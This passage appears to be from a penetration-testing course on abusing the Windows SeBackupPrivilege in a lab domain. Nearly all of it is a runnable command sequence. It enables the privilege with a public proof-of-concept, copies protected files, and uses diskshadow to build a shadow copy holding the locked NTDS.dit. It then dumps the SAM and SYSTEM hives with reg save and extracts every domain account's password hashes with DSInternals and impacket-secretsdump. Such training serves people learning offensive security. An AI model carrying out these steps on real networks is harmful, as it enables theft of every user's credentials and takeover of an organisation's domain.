
We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

```
Import-Module .\SeBackupPrivilegeUtils.dll
```
```
Import-Module .\SeBackupPrivilegeCmdLets.dll
```


If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

```
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

### Copying a Protected File

```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```


### Attacking a Domain Controller - Copying NTDS.dit

This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```
diskshadow.exe
```

```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

### Copying NTDS.dit Locally

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Backing up SAM and SYSTEM Registry Hives

```
reg save HKLM\SYSTEM SYSTEM.SAV
```

```
reg save HKLM\SAM SAM.SAV
```

### Extracting Credentials from NTDS.dit

```
Import-Module .\DSInternals.psd1
```

```
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

```
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Extracting Hashes Using SecretsDump

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


## Robocopy

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

